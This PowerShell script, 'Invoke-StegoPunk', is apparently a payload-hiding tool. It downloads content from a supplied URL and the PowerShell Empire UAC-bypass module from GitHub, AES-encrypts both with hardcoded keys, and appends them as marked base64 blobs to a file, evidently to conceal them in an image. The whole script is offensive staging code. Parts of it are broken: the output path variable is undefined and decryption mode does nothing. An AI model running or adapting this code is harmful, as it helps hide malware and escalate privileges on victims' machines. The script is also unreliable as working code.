Param (
             [string]$Mode = "$null",
             [Parameter(Mandatory=$True)]
            [string]$Fileurl = "$null",
             [Parameter(Mandatory=$True)]
            [string]$ImageUrl = "$null",
            [Parameter(Mandatory=$True)]
            [string]$ImagepathName = "$null"
       )

function Invoke-StegoPunk {
                  
     
      if ($Mode -eq "encryption")
          {
          write-host "Encryption Mode" 
          $request = New-Object System.Net.WebCLient
          $proxy = New-Object System.Net.webproxy
          $request.proxy = $proxy
          $request.usedefaultcredentials = "true";
          $inputstring = $request.DownloadString($fileurl)
          $Imagepath = "$ENV:temp\qwerty.png"
          $request.Downloadfile("$ImageUrl",$Imagepathname)
          $InputBytes = [Text.Encoding]::utf8.GetBytes($InputString)
          $AES = New-Object System.Security.Cryptography.AesManaged
          $Passphrase="Passo"
          $salt="My Voice is my P455W0RD!"
          $init="Yet another key"
          $pass = [Text.Encoding]::UTF8.GetBytes($Passphrase)
          $salt = [Text.Encoding]::UTF8.GetBytes($salt)
          $AES.BlockSize = 128
          $AES.KeySize = 256
          $AES.Key = (new-Object Security.Cryptography.PasswordDeriveBytes $pass, $salt, "SHA1", 5).GetBytes(32) #256/8
          $AES.IV = (new-Object Security.Cryptography.SHA1Managed).ComputeHash( [Text.Encoding]::UTF8.GetBytes($init) )[0..15]
          $AES.Padding = [System.Security.Cryptography.PaddingMode]::Zeros
          $Encryptor = $AES.CreateEncryptor()
          $MemoryStream = New-Object -TypeName System.IO.MemoryStream
          $StreamMode =[System.Security.Cryptography.CryptoStreamMode]::Write
          $CryptoStream = New-Object -TypeName System.Security.Cryptography.CryptoStream -ArgumentList $MemoryStream,$Encryptor,$StreamMode
          $CryptoStream.Write($InputBytes, 0, $InputBytes.Length)
          $CryptoStream.Dispose()
          [byte[]]$Encrypted = $MemoryStream.ToArray()
          $CryptoStream.Close()
          $MemoryStream.Close()
          $AES.Clear()
          $mio = [system.Convert]::ToBase64String($Encrypted)

          $b_url = 'https://raw.githubusercontent.com/PowerShellEmpire/Empire/master/data/module_source/privesc/Invoke-BypassUAC.ps1'

          $inputstring = $request.DownloadString($b_url)
          $InputBytes = [Text.Encoding]::utf8.GetBytes($InputString)
          $AES = New-Object System.Security.Cryptography.AesManaged
          $Passphrase="Passo"
          $salt="My Voice is my P455W0RD!"
          $init="Yet another key"
          $pass = [Text.Encoding]::UTF8.GetBytes($Passphrase)
          $salt = [Text.Encoding]::UTF8.GetBytes($salt)
          $AES.BlockSize = 128
          $AES.KeySize = 256
          $AES.Key = (new-Object Security.Cryptography.PasswordDeriveBytes $pass, $salt, "SHA1", 5).GetBytes(32) #256/8
          $AES.IV = (new-Object Security.Cryptography.SHA1Managed).ComputeHash( [Text.Encoding]::UTF8.GetBytes($init) )[0..15]
          $AES.Padding = [System.Security.Cryptography.PaddingMode]::Zeros
          $Encryptor = $AES.CreateEncryptor()
          $MemoryStream = New-Object -TypeName System.IO.MemoryStream
          $StreamMode =[System.Security.Cryptography.CryptoStreamMode]::Write
          $CryptoStream = New-Object -TypeName System.Security.Cryptography.CryptoStream -ArgumentList $MemoryStream,$Encryptor,$StreamMode
          $CryptoStream.Write($InputBytes, 0, $InputBytes.Length)
          $CryptoStream.Dispose()
          [byte[]]$Encrypted = $MemoryStream.ToArray()
          $CryptoStream.Close()
          $MemoryStream.Close()
          $AES.Clear()
          $mio2 = [system.Convert]::ToBase64String($Encrypted)

          $mio = "wootwoot" + $mio + "weetweet" + $mio2

          Add-Content "$percorso" $mio
          } 
        else
          {
           if ($Mode -eq "decryption")
               {
                write-host "Decryption Mode" 
               }
              else
               {
                write-host "hdhdhdhdhhdhahahahahahah"
               }
               
          }
         
}
